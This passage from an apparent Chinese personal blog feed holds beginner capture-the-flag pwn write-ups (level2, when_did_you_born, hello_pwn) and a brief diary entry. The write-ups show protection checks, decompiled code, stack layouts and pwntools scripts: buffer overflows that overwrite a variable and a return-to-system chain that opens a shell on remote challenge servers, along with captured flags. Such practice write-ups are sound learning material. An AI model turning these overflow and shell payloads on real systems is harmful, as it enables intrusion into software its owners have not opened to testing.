class="comment">#cyberpeace&#123;dbba6a81a0525dd630d5178dd078059f&#125;</span></span><br></pre></td></tr></table></figure><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><h2 id="运行下："><a href="#运行下：" class="headerlink" title="运行下："></a>运行下：</h2><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutou<span class="meta">@mutou</span>-<span class="string">vm:</span><span class="regexp">~/下载$ ./</span>level2</span><br><span class="line"><span class="string">Input:</span></span><br><span class="line">yangmutou!</span><br><span class="line">Hello World!</span><br><span class="line">mutou<span class="meta">@mutou</span>-<span class="string">vm:</span>~/下载$</span><br></pre></td></tr></table></figure><h2 id="检查文件属性及保护：-1"><a href="#检查文件属性及保护：-1" class="headerlink" title="检查文件属性及保护："></a>检查文件属性及保护：</h2><blockquote><p>32位elf程序，NX enabled保护</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">mutou@mutou-vm:~/下载$</span> <span class="string">checksec</span> <span class="string">level2</span></span><br><span class="line"><span class="string">[*]</span> <span class="string">'/home/mutou/\xe4\xb8\x8b\xe8\xbd\xbd/level2'</span></span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br><span class="line"><span class="string">mutou@mutou-vm:~/下载$</span></span><br></pre></td></tr></table></figure><h2 id="拖入ida（32）分析："><a href="#拖入ida（32）分析：" class="headerlink" title="拖入ida（32）分析："></a>拖入ida（32）分析：</h2><blockquote><p>主函数：首先调用了   vulnerable_function()函数，然后调用了system</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">"echo 'Hello World!'"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>vulnerable_function()函数跟进去：</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><blockquote><p>这里题目提示   用rop技术做这题，所以我们就要构造个伪栈帧，来执行system(“/bin/sh”)函数;下图，更助于理解！<br><img src="https://s2.ax1x.com/2019/10/07/uWucCT.png" alt="uWucCT.png"></p></blockquote><h2 id="构造payload：-1"><a href="#构造payload：-1" class="headerlink" title="构造payload："></a>构造payload：</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment">#conn=process('./level2')</span></span><br><span class="line">conn=remote('111.198.29.45','48927')</span><br><span class="line"></span><br><span class="line">system_addr=0x08048320</span><br><span class="line">sh_addr=0x0804A024</span><br><span class="line"></span><br><span class="line">payload=(0x88+0x4)*'a'+p32(system_addr)+p32(0x0)+p32(sh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">conn.recvuntil('Input:\n')</span></span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()<span class="comment">#cyberpeace&#123;4e2601736e82eda491bae13188a33252&#125;</span></span><br></pre></td></tr></table></figure><h2 id="上面这是我在做前几题的用仅有的经验写出的脚本，而我在wp中看到了这样脚本；"><a href="#上面这是我在做前几题的用仅有的经验写出的脚本，而我在wp中看到了这样脚本；" class="headerlink" title="上面这是我在做前几题的用仅有的经验写出的脚本，而我在wp中看到了这样脚本；"></a>上面这是我在做前几题的用仅有的经验写出的脚本，而我在wp中看到了这样脚本；</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># codin<span class="variable">g:utf</span>-<span class="number">8</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="keyword">sh</span> = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9878</span>)</span><br><span class="line"># <span class="keyword">sh</span> = process(<span class="string">"./level2"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>) </span><br><span class="line">_sys_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">sh_addr = elf.<span class="built_in">search</span>(<span class="string">'/bin/sh'</span>).<span class="keyword">next</span>()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0</span>x88 + <span class="number">0</span>x4) + p32(_sys_addr) + p32(<span class="number">0</span>x0) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(payload)</span><br><span class="line"><span class="keyword">sh</span>.interactive()</span><br><span class="line"><span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">作者：ch3ckr</span><br><span class="line">链接：http<span class="variable">s:</span>//www.jianshu.<span class="keyword">com</span>/<span class="keyword">p</span>/<span class="number">92</span>d3cf7aa126</span><br><span class="line">來源：简书</span><br><span class="line">简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</span><br></pre></td></tr></table></figure><blockquote><p>原来这里的elf.symbols[‘system’]是  pwntools的elf模块中的symbols函数用来定位实际函数位置！了解到了，接下来我要接触下这个！</p></blockquote><p><br><br><br><br><br><br><br><img src="https://s2.ax1x.com/2019/09/27/uuZQNF.png" alt="uuZQNF.png"><br>终要加冕！//其实没有看过这个动画或者它的背景，看图生意！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;只能做做新手题…&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>疯狂的木头06</title>
    <link href="http://yoursite.com/2019/10/03/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B406/"/>
    <id>http://yoursite.com/2019/10/03/疯狂的木头06/</id>
    <published>2019-10-03T13:27:12.000Z</published>
    <updated>2019-11-02T13:44:23.891Z</updated>
    
    <content type="html"><![CDATA[<p>出来放松下这两天，和重要的人一起。</p><a id="more"></a><h1 id="今日无记录！"><a href="#今日无记录！" class="headerlink" title="今日无记录！"></a>今日无记录！</h1><p><img src="https://s2.ax1x.com/2019/09/19/nOsgw4.jpg" alt="nOsgw4.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;出来放松下这两天，和重要的人一起。&lt;/p&gt;
    
    </summary>
    
    
      <category term="疯狂的木头" scheme="http://yoursite.com/tags/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B4/"/>
    
  </entry>
  
  <entry>
    <title>国庆七天之pwn01</title>
    <link href="http://yoursite.com/2019/10/02/%E5%9B%BD%E5%BA%86%E4%B8%83%E5%A4%A9%E4%B9%8Bpwn01/"/>
    <id>http://yoursite.com/2019/10/02/国庆七天之pwn01/</id>
    <published>2019-10-02T04:45:33.000Z</published>
    <updated>2019-10-02T05:00:49.287Z</updated>
    
    <content type="html"><![CDATA[<p>我好想有点入门了，哈哈！接下来就是在虚拟机中安装或者使用vim与sublime了，接下来要做的事情！</p><a id="more"></a><h1 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h1><blockquote><p>首先检查文件属性以及保护</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mutou<span class="meta">@mutou</span>-<span class="string">vm:</span>~/下载$ checksec when_did_you_born</span><br><span class="line">[*] <span class="string">'/home/mutou/\xe4\xb8\x8b\xe8\xbd\xbd/when_did_you_born'</span></span><br><span class="line"><span class="symbol">    Arch:</span>     amd64<span class="number">-64</span>-little</span><br><span class="line"><span class="symbol">    RELRO:</span>    Partial RELRO</span><br><span class="line"><span class="symbol">    Stack:</span>    Canary found</span><br><span class="line"><span class="symbol">    NX:</span>       NX enabled</span><br><span class="line"><span class="symbol">    PIE:</span>      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">mutou<span class="meta">@mutou</span>-<span class="string">vm:</span>~/下载$ </span><br><span class="line">mutou<span class="meta">@mutou</span>-<span class="string">vm:</span>~/下载$ </span><br><span class="line">mutou<span class="meta">@mutou</span>-<span class="string">vm:</span>~/下载$ </span><br><span class="line">mutou<span class="meta">@mutou</span>-<span class="string">vm:</span>~/下载$ file when_did_you_born</span><br><span class="line"><span class="string">when_did_you_born:</span> ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter <span class="regexp">/lib64/</span>l, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">718185</span>b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped</span><br><span class="line">mutou<span class="meta">@mutou</span>-<span class="string">vm:</span>~/下载$</span><br></pre></td></tr></table></figure><blockquote><p>我们拖入  ida查找下  漏洞：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]//这里注意下</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]//还有这里，双击进去查看栈结构</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's Your Birth?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);                    <span class="comment">// 输入   v5</span></span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )                     <span class="comment">// 输入  不能等于    10</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1926</span> )                             <span class="comment">// 输入 1926的话直接退出程序</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You Cannot Born In 1926!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"What's Your Name?"</span>);                  <span class="comment">// 输入   v4 </span></span><br><span class="line">    gets(&amp;v4);                                  <span class="comment">// gets()函数，无限输入   即此题的漏洞点</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You Are Born In %d\n"</span>, v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1926</span> )                           <span class="comment">// else 之后又对v5 做检查， 所以需要v5=1926</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Shall Have Flag."</span>);</span><br><span class="line">      system(<span class="string">"cat flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Are Naive."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Speed One Second Here."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这个很重要，他们在栈中的位置，及相隔位置：</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#v4 [<span class="built_in">rsp</span>-<span class="number">0h</span>] [<span class="built_in">rbp</span>-<span class="number">20h</span>]</span><br><span class="line">#v5 [<span class="built_in">rsp</span>+<span class="number">8</span>] [<span class="built_in">rbp</span>-<span class="number">18h</span>]</span><br></pre></td></tr></table></figure><blockquote><p>进去查看它的栈结构：</p></blockquote><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby"><span class="number">0000000000000020</span> ; D/A/*   : change type (data/ascii/array)</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000020</span> ; N       : rename</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000020</span> ; U       : undefine</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000020</span> ; Use data definition commands to create local variables <span class="keyword">and</span> function arguments.</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000020</span> ; Two special fields <span class="string">" r"</span> <span class="keyword">and</span> <span class="string">" s"</span> represent <span class="keyword">return</span> address <span class="keyword">and</span> saved registers.</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000020</span> ; Frame <span class="symbol">size:</span> <span class="number">20</span>; Saved <span class="symbol">regs:</span> <span class="number">8</span>; <span class="symbol">Purge:</span> <span class="number">0</span></span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000020</span> ;</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000020</span></span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000020</span> var_2<span class="number">0</span>          db ?<span class="regexp">//v</span>4</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>F                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>E                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>D                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>C                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>B                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>A                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>9                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000001</span>8 var_18          dd ?<span class="regexp">//v</span>5</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000014</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000013</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000012</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000011</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">0000000000000010</span>                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000000</span>F                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000000</span>E                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000000</span>D                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000000</span>C                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000000</span>B                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000000</span>A                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000000</span>9                 db ? ; undefined</span></span><br><span class="line"><span class="ruby">-<span class="number">000000000000000</span>8 var_8           dq ?</span></span><br><span class="line"><span class="ruby">+<span class="number">0000000000000000</span>  s              db <span class="number">8</span> dup(?)</span></span><br><span class="line"><span class="ruby">+<span class="number">000000000000000</span>8  r              db <span class="number">8</span> dup(?)</span></span><br><span class="line"><span class="ruby">+<span class="number">0000000000000010</span></span></span><br><span class="line"><span class="ruby">+<span class="number">0000000000000010</span> ; <span class="keyword">end</span> of stack variables</span></span><br></pre></td></tr></table></figure><blockquote><p>分析：<br>我们现在将v4 与v5之间的8个字节给填充垃圾数据，然后再在v5位置写入1926即可</p></blockquote><blockquote><p>构造payload：</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="comment">#v4 [rsp-0h] [rbp-20h]</span></span><br><span class="line"><span class="comment">#v5 [rsp+8] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span>=<span class="string">'a'</span>*8+p64(1926)</span><br><span class="line"></span><br><span class="line"><span class="comment">#conn=process('./when_did_you_born')</span></span><br><span class="line"><span class="attribute">conn</span>=remote("111.198.29.45","33340")</span><br><span class="line">conn.recvuntil(<span class="string">'irth?'</span>)</span><br><span class="line">conn.sendline(<span class="string">'1999'</span>)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(p64(1926))</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">'r Name?'</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>运行，于是得到  flag：</p></blockquote><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">cyberpeace</span><span class="template-variable">&#123;292b64bccafa1d70947a312f75f8062d&#125;</span></span><br></pre></td></tr></table></figure><h1 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h1><blockquote><p>检查文件属性及保护：</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">mutou@mutou-vm:~/下载$</span> <span class="string">file</span> <span class="string">hello_pwn</span></span><br><span class="line"><span class="attr">hello_pwn:</span> <span class="string">ELF</span> <span class="number">64</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">x86-64,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib64/l,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.32</span><span class="string">,</span> <span class="string">BuildID[sha1]=05ef7ecf06e02e7f199b11c4647880e8379e6ce0,</span> <span class="string">stripped</span></span><br><span class="line"><span class="string">mutou@mutou-vm:~/下载$</span> <span class="string">checksec</span> <span class="string">hello_pwn</span></span><br><span class="line"><span class="string">[*]</span> <span class="string">'/home/mutou/\xe4\xb8\x8b\xe8\xbd\xbd/hello_pwn'</span></span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br><span class="line"><span class="string">mutou@mutou-vm:~/下载$</span></span><br></pre></td></tr></table></figure><blockquote><p>64位，小段模式，动态链接，然后开启了NX的保护，但是NX保护对.bss段不起作用！于是我们将它拖入ida   我们分析下流程（漏洞）：</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"~~ welcome to ctf ~~     "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"lets get helloworld for bof"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;unk_601068, <span class="number">0x10</span>uLL);                <span class="comment">// 读入我们输入的 10个数  放在   unk_601068地址上</span></span><br><span class="line">  <span class="keyword">if</span> ( dword_60106C == <span class="number">1853186401</span> )             <span class="comment">// 如果  dword_60106C==1853186401   即执行下面sub_400686()函数</span></span><br><span class="line">    sub_400686();                               <span class="comment">// system("cat flag.txt");</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们进入栈页面看下他们的偏移位置及相隔位置：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.<span class="string">bss:</span><span class="number">0000000000601058</span>                                         ; Copy of shared data</span><br><span class="line">.<span class="string">bss:</span><span class="number">0000000000601060</span> byte_601060     db ?                    ; DATA XREF: sub_400640↑r</span><br><span class="line">.<span class="string">bss:</span><span class="number">0000000000601060</span>                                         ; sub_400640+<span class="number">13</span>↑w</span><br><span class="line">.<span class="string">bss:</span><span class="number">0000000000601061</span>                 align <span class="number">8</span></span><br><span class="line">.<span class="string">bss:</span><span class="number">0000000000601068</span> unk_601068      db    ? ;               ; DATA XREF: main+<span class="number">3</span>B↑o   <span class="comment">//我们输入的数据存的地方</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.<span class="string">bss:</span><span class="number">0000000000601069</span>                 db    ? ;</span><br><span class="line">.bss:<span class="number">000000000060106</span>A                 db    ? ;</span><br><span class="line">.bss:<span class="number">000000000060106</span>B                 db    ? ;</span><br><span class="line">.bss:<span class="number">000000000060106</span>C dword_60106C    dd ?                    ; DATA XREF: main+<span class="number">4</span>A↑r <span class="comment">//进行 if判断的地方</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.<span class="string">bss:</span><span class="number">000000000060106</span>C _bss            ends</span><br><span class="line">.<span class="string">bss:</span><span class="number">000000000060106</span>C</span><br></pre></td></tr></table></figure><blockquote><p>分析：</p></blockquote><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u<span class="symbol">nk_601068</span>与dword_<span class="number">60106</span>C相隔 <span class="number">4</span>个字节 而u<span class="symbol">nk_601068</span>位置里的内容又必须是 <span class="number">1853186401</span> 所以，我们输入<span class="number">4</span>个随便数据用于填充，再输入p<span class="number">64</span><span class="comment">(1853186401)</span>覆盖为u<span class="symbol">nk_601068</span>地址所指的 内容</span><br></pre></td></tr></table></figure><blockquote><p>构造payload：</p></blockquote><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">#conn=process(<span class="string">'./hello_pwn'</span>)</span><br><span class="line">conn=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'58758'</span>)</span><br><span class="line">conn.recvuntil(<span class="string">"bof"</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>运行于是得到  flag：</p></blockquote><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;<span class="number">1</span>dac<span class="number">28964</span><span class="keyword">cc</span><span 